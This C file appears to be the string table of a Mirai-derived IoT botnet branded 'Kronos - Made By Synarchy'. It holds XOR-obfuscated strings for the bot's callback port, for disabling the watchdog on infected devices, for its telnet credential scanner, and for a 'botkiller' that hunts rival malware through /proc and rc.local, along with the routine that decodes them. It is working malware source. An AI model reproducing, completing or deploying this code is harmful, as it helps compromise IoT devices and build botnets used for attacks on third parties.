#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "table.h"
#include "util.h"

uint32_t table_key = 0xbaadf00d;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
	// Encrypted Strings For Main
    add_entry(TABLE_SCAN_CB_PORT, "\xA9\xE6", 2); // 17164
    add_entry(TABLE_NULL, "\xC2\x84\x9F\x86\x86\xC3\xEA", 7); // (null)
    add_entry(TABLE_EXEC_SUCCESS, "\xA1\x98\x85\x84\x85\x99\xCA\xC7\xCA\xA7\x8B\x8E\x8F\xCA\xA8\x93\xCA\xB9\x93\x84\x8B\x98\x89\x82\x93\xEA", 26); // Kronos - Made By Synarchy
    add_entry(TABLE_RANDOM, "\xD8\x88\x86\xDE\xA7\x9B\xBD\x8E\xAC\x83\x8F\x8B\x87\x81\x8C\xDF\xDC\xB8\xA3\x98\xBF\xAF\x85\xAB\xA1\xBC\xA6\xB0\xA5\xB9\xBB\xA2\xBE\xB2\xDB\x9E\x9A\xB3\xA0\xAE\x9F\x80\xD2\x89\x84\xDD\xA9\x8D\x99\x9D\xA8\x9C\xA4\xBA\x82\xDA\xAD\xD9\xEA", 59); // 2bl4MqWdFieamkf56RIrUEoAKVLZOSQHTX1tpYJDuj8cn7CgswBvNPh0G3 
    add_entry(TABLE_IOCTL_KEEPALIVE1, "\xC5\x8E\x8F\x9C\xC5\x9D\x8B\x9E\x89\x82\x8E\x85\x8D\xEA", 14); // /dev/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE2, "\xC5\x8E\x8F\x9C\xC5\x87\x83\x99\x89\xC5\x9D\x8B\x9E\x89\x82\x8E\x85\x8D\xEA", 19); // /dev/misc/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE3, "\xC5\x8E\x8F\x9C\xC5\xAC\xBE\xBD\xAE\xBE\xDB\xDA\xDB\xB5\x9D\x8B\x9E\x89\x82\x8E\x85\x8D\xEA", 23); // /dev/FTWDT101_watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE4, "\xC5\x8E\x8F\x9C\xC5\xAC\xBE\xBD\xAE\xBE\xDB\xDA\xDB\xB6\xCA\x9D\x8B\x9E\x89\x82\x8E\x85\x8D\xEA", 24); // /dev/FTWDT101\ watchdog

    // Encrypted Strings For Scanner
    add_entry(TABLE_SCAN_SHELL, "\x99\x82\x8F\x86\x86\xEA", 6); // shell
    add_entry(TABLE_SCAN_ENABLE, "\x8F\x84\x8B\x88\x86\x8F\xEA", 7); // enable
    add_entry(TABLE_SCAN_SYSTEM, "\x99\x93\x99\x9E\x8F\x87\xEA", 7); // system
    add_entry(TABLE_SCAN_SH, "\x99\x82\xEA", 3); // sh
    add_entry(TABLE_SCAN_QUERY, "\xC5\x88\x83\x84\xC5\x88\x9F\x99\x93\x88\x85\x92\xCA\xB9\xB3\xA4\xAB\xB8\xA9\xA2\xB3\xEA", 22); // /bin/busybox SYNARCHY
    add_entry(TABLE_SCAN_RESP, "\xB9\xB3\xA4\xAB\xB8\xA9\xA2\xB3\xD0\xCA\x8B\x9A\x9A\x86\x8F\x9E\xCA\x84\x85\x9E\xCA\x8C\x85\x9F\x84\x8E\xEA", 27); // SYNARCHY: applet not found
    add_entry(TABLE_SCAN_NCORRECT, "\x84\x89\x85\x98\x98\x8F\x89\x9E\xEA", 9); // ncorrect
    add_entry(TABLE_SCAN_OGIN, "\x85\x8D\x83\x84\xEA", 5); // ogin
    add_entry(TABLE_SCAN_ENTER, "\x8F\x84\x9E\x8F\x98\xEA", 6); // enter
    add_entry(TABLE_SCAN_ASSWORD, "\x8B\x99\x99\x9D\x85\x98\x8E\xEA", 8); // assword

    //For The Botkiller
    add_entry(TABLE_KILLER_PROC, "\xC5\x9A\x98\x85\x89\xC5\xEA", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\xC5\x8F\x92\x8F\xEA", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\xC5\x8C\x8E\xEA", 4); // /fd
    add_entry(TABLE_KILLER_MAPS, "\xC5\x87\x8B\x9A\x99\xEA", 6); // /maps
    add_entry(TABLE_KILLER_TCP, "\xC5\x9A\x98\x85\x89\xC5\x84\x8F\x9E\xC5\x9E\x89\x9A\xEA", 14); // /proc/net/tcp
    add_entry(TABLE_KILLER_STATUS, "\xC5\x99\x9E\x8B\x9E\x9F\x99\xEA", 8); // /status
    add_entry(TABLE_KILLER_ANIME, "\xC4\x8B\x84\x83\x87\x8F\xEA", 7); // .anime
    add_entry(TABLE_MEM_ROUTE, "\xC5\x9A\x98\x85\x89\xC5\x84\x8F\x9E\xC5\x98\x85\x9F\x9E\x8F\xEA", 16); // /proc/net/route
    add_entry(TABLE_MEM_RC, "\xC5\x8F\x9E\x89\xC5\x98\x89\xC4\x8E\xC5\x98\x89\xC4\x86\x85\x89\x8B\x86\xEA", 19); // /etc/rc.d/rc.local
    add_entry(TABLE_MEM_ASSWORD, "\x8B\x99\x99\x9D\x85\x98\x8E\xEA", 8); // assword
    add_entry(TABLE_MEM_DVRHELP, "\x8E\x9C\x98\xA2\x8F\x86\x9A\x8F\x98\xEA", 10); // dvrHelper
    add_entry(TABLE_MEM_SHINTO3, "\xBD\x99\xAD\xAB\xDE\xAA\xAC\xDC\xAC\xEA", 10); // WsGA4@F6F
    add_entry(TABLE_MEM_SHINTO5, "\xAB\xA9\xAE\xA8\xEA", 5); // ACDB
    add_entry(TABLE_MEM_JOSHO1, "\xAB\x88\xAB\x8E\xEA", 5); // AbAd
    add_entry(TABLE_MEM_JOSHO2, "\x83\x8B\xAD\x9C\xEA", 5); // iaGv
    add_entry(TABLE_MEM_UPX, "\xBF\xBA\xB2\xCB\xEA", 5); // UPX!
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];
    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];
    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];
    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);
    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }
}
